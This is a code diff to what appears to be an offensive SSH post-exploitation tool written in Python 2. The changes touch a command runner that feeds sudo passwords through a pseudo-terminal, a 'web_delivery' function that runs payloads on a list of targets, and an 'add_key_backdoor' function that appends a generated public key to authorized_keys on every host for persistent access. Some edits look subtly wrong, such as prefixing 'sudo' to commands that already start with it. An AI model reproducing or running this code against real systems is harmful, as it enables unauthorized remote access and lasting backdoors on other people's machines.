@@ -121,7 +121,14 @@ def execute_command(ip, username, password, identity_file, command, timeout):
     client = connect(ip, username, password, identity_file)
     try:
         if client:
-            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
+            if password and command[:4] == "sudo":
+                print "hit"
+                command = "sudo " + command
+                stdin, stdout, stderr = client.exec_command(command, timeout=timeout, get_pty=True)
+                stdin.write(password + '\n')
+                stdin.flush()
+            else:
+                stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
             print CGREEN + "[+] Executed on " + str(ip) + "..." + CEND
             for line in stdout:
                 print line.strip()
@@ -133,7 +140,7 @@ def check_privs(ip, username, password, identity_file, timeout):
     client = connect(ip, username, password, identity_file)
     try:
         if client != False:
-            stdin, stdout, stderr = client.exec_command("sudo --list", timeout=timeout, get_pty = True)
+            stdin, stdout, stderr = client.exec_command("sudo --list", timeout=timeout, get_pty=True)
             if password:
                 stdin.write(password + '\n')
                 stdin.flush()
@@ -289,15 +296,16 @@ def web_delivery(lhost, lport, targets, port, username, password, identity_file,
     print CGREEN + "[!] Executing payload on the targets..." + CEND
     start_thread(targets, "execute_command", [22, username, password, identity_file, command, 10])
 
+
 def add_key_backdoor(targets, port, username, password, identity_file):
-    name = randomword(10)
+    name = randomword(4)
     print CGREEN + "[!] Generating RSA key pair..." + CEND
     key = RSA.generate(2048)
     with open("payloads/"+ name + "_private.key", 'w') as content_file:
         os.chmod("payloads/"+ name + "_private.key", 0600)
-        print CYELLOW + "[*] " + name + "payloads/_private.key created" + CEND
+        print CYELLOW + "[*] payloads/" + name + "_private.key created" + CEND
         content_file.write(key.exportKey('PEM'))
-        print CYELLOW + "[*] " + name + "payloads/_private.key created" + CEND
+        print CYELLOW + "[*] payloads/" + name + "_private.key created" + CEND
     pubkey = key.publickey()
     with open("payloads/"+ name + "_public.key", 'w') as content_file:
         content_file.write(pubkey.exportKey('OpenSSH'))
@@ -305,7 +313,6 @@ def add_key_backdoor(targets, port, username, password, identity_file):
     command = "echo \"" + key + "\" >> ~/.ssh/authorized_keys"
     print CGREEN + "[!] Adding SSH public key to Authorized key file... " + CEND
     start_thread(targets, "execute_command", [22, username, password, identity_file, command, 10])
-
 
 
 def parse_targets(target):
